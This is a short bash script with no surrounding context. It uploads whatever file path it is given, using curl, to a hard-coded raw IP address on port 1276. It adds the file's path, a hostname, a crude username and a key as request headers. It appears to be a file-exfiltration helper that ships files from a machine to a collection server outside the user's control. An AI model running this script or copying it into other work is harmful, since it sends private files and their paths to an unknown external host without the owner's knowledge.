#!/bin/bash

FILE="$1"
URL="http://195.201.104.53:1276/upload"

curl -v \
  -F "file=@${FILE}" \
  -H "path: ${FILE}" \
  -H "hostname: janganmenyerang" \
  -H "username: ngentot" \
  -H "userkey: 821" \
  "${URL}"

